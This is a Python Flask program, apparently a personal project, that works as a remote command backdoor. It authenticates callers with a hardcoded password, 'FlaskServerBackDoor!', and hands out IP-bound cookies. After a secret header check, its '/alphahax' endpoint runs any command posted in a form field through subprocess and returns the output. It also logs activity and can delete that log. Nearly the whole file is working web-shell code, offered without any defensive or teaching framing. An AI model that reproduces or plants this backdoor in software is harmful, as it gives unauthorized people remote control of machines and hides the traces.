#Author : Heirberto Ramirez
#Description : take commands from web int

from re import A
from flask import Flask, request, render_template, Response
import subprocess
from datetime import datetime
import random
import string

app = Flask('alpha')

authIps = []
authCookieAndIps = {}
cookieAndTime = {}


def writeTxtReport(jsonData) :
    txtFile = open('report.txt', 'a+')
    txtFile.write(str(jsonData))
    txtFile.close()

def getTxtReport() :
    txtFile = open('report.txt', 'r')
    txtReport = txtFile.read()
    #print(txtReport)
    txtFile.close()

    return txtReport

def searchStringInFile(findme):
    found = []
    
    txtFile = open('report.txt', 'r')
    
    while True :
        txtReport = txtFile.readline()

        if not txtReport :
            break

        if findme in txtReport :
            found.append(txtReport)

    txtFile.close()
    
    return found

def cookie_generator(size=50, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def confirmCookie(cookiekey, ip) : 
    if cookiekey in authCookieAndIps[ip] :
        return True
    else :
        return False
    
def verifyIp(ip) :
    if ip in authIps :
        return True
    else :
        return False

def checkCookieTime(cookiekey) :
    timeStamp = cookieAndTime[cookiekey]
    return timeStamp

def checkIpsList(ip):
    if ip in authIps :
        return True
    else :
        return False

#@app.route('/')
#def rootdir():
    #headers = request.headers
    #return str(headers)
    #defaultsite = render_template('get_form.html')
    #return defaultsite

#display input box for comamnds
#@app.route('/guilfordhax')
#def displayComForm() :
    #postComForm = render_template('guilfordhaxform.html')
    #return postComForm

@app.errorhandler(405)
def page_not_found(e):
    # note that we set the 405 status explicitly
    return render_template('405.html'), 405

@app.route('/getauth', methods=['POST'])
def getAuth() :
    try:
        authPassword = request.form['pass'][0:20]

        if authPassword == 'FlaskServerBackDoor!' : 

            #log eerything
            getIp = request.remote_addr
            getMeth = request.method
            getUrl = request.url

            #check if ip already in allowed list and give cookie
            isIpInList = checkIpsList(getIp)

            #print(isIpInList)
            
            if isIpInList == True :

                getCookie = authCookieAndIps[getIp]
                getDate = datetime.now().strftime('''%d/%m/%Y, %H:%M:%S''')

                txtData = '( IP : %s // Method : %s // URL : %s // Continued Using Cookie : %s // Date : %s )\n' % (getIp, getMeth, getUrl, getCookie, getDate)

                writeTxtReport(txtData)

                return getCookie
            
            #add requester ip to allowed list
            authIps.append(getIp)

            if getIp in authIps :
                
                #generate auth coookie
                cookiekey = cookie_generator()
            
                #add cookie to allowed list with timestamp and periodic checking from last time cookie sent
                getTimestamp = datetime.now().strftime('''%M''')
                authCookieAndIps[getIp] = cookiekey
                cookieAndTime[cookiekey] = getTimestamp 

                getCookie = authCookieAndIps[getIp]

                getDate = datetime.now().strftime('''%d/%m/%Y, %H:%M:%S''')

                txtData = '( IP : %s // Method : %s // URL : %s // Cookie : %s // Cookie Created Date : %s )\n' % (getIp, getMeth, getUrl, getCookie, getDate)

                writeTxtReport(txtData)

                #send cookie back
                return getCookie

        else :
            #wrong password
            #log eerything
            getIp = request.remote_addr
            getMeth = request.method
            getUrl = request.url
            getDate = datetime.now().strftime('''%d/%m/%Y, %H:%M:%S''')

            txtData = '( IP : %s // Method : %s // URL : %s // Auth Attempted : %s // Date : %s )\n' % (getIp, getMeth, getUrl, authPassword, getDate)

            writeTxtReport(txtData)

            status_code = Response(status=403)
            return status_code

    except:
        #no post data for pass
        status_code = Response(status=403)
        return status_code

@app.route('/alphahax', methods=['POST'])
def postComForm() : 

    ip = request.remote_addr
    verified = verifyIp(ip)

    if verified != True :
        #IP Not Authenticated
        status_code = Response(status=403)
        return status_code
        

    try :

        cookiekey = request.headers['X-AuthHeader']

        validTimeStamp = checkCookieTime(cookiekey)
        currentTimeStamp = datetime.now().strftime('''%M''')

        elapsedTime = int(currentTimeStamp) - int(validTimeStamp)

        #this is not exactly 11 minutes!!! It does subtraction by literal minute so if the timestamp is at 15:12:59 and the current timestamp is 15:23:00 it will still count it as 10. 
        if int(elapsedTime) > 10 :

            #remove ip from list
            authIps.remove(ip)

            #remove cookie and ip from list
            authCookieAndIps.pop(ip, None)

            #remove timestamp 
            cookieAndTime.pop(cookiekey,None)

            getMeth = request.method
            getUrl = request.url

            txtData = '( IP : %s // Method : %s // URL : %s // Cookie Deleted : %s )\n' % (ip, getMeth, getUrl, cookiekey)

            writeTxtReport(txtData)

            return 'Re-Authentication Required'
        

        authResp = confirmCookie(cookiekey,ip)

        if authResp != True :

            #Cookie Key Not Authenticated
            status_code = Response(status=403)
            return status_code
            


        prereqheadkey = request.headers['X-AlphaCommand-Expert']
        

        if prereqheadkey == 'alphahaxmaster' :

            data = request.form['alphacom']
            prefData = data.split(' ')
            processed_data = data.lower()
            command_data = processed_data.split(' ')

            #print(command_data)

            getIp = request.remote_addr
            getMeth = request.method
            getUrl = request.url
            getDate = datetime.now().strftime('''%d/%m/%Y, %H:%M:%S''')

            txtData = '( IP : %s // Method : %s // URL : %s // Command : %s // Cookie : %s // Date : %s )\n' % (getIp, getMeth, getUrl, processed_data, cookiekey, getDate)

            writeTxtReport(txtData)

            if command_data == ['show', 'report'] :
                
                txtReport = getTxtReport()

                return txtReport

            elif command_data == ['erase', 'report'] :

                command_data = ['rm', 'report.txt']
                subprocess.run(command_data)

                return 'Done!'

            elif 'search' in command_data :

                stringsFound = str(searchStringInFile(prefData[1]))

                return stringsFound

            elif command_data == ['show', 'cookie'] :
                return cookiekey
            
            elif command_data == ['show', 'auth'] :
                return str(authIps)

            try :
                result = subprocess.run(command_data, capture_output=True)
            except :
                return 'Invalid Command or Empty Response\n'

            if result == False :
                return 'Invalid Command or Empty Response !'

            stan_result = result.stdout.decode()
            error_result = result.stderr.decode()
            
            if stan_result != '' :
                return stan_result 
            elif error_result != '' :
                return error_result
            else :
                return 'Invalid Command or Empty Response!'

        else :
            #header found but no key
            status_code = Response(status=403)
            return status_code

    except :
        #no auth headers found
        status_code = Response(status=403)
        return status_code


app.run(host='127.0.0.1', port=6969, ssl_context='adhoc')
#app.run(host='0.0.0.0', port=6969)